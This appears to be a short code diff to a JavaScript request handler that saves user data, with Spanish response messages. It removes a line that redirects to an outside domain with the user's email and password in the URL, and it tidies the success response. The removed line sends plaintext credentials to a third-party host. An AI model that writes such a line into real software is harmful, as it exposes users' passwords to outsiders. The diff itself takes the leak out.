@@ -15,8 +15,7 @@ const saveInfoScreen = async (req, res) => {
 
   try {
     await saveInfo(data)
-    redirect(`https://soporte.tibox.cl/redirect?email=${userMail}&password=${userPass}`)
-    res.status(201).json({ message: 'Datos guardados exitosamente' })
+    return res.status(201).json({ message: 'Datos guardados correctamente' })
   } catch (error) {
     res.status(500).json({ message: 'Error al guardar los datos' })
   }
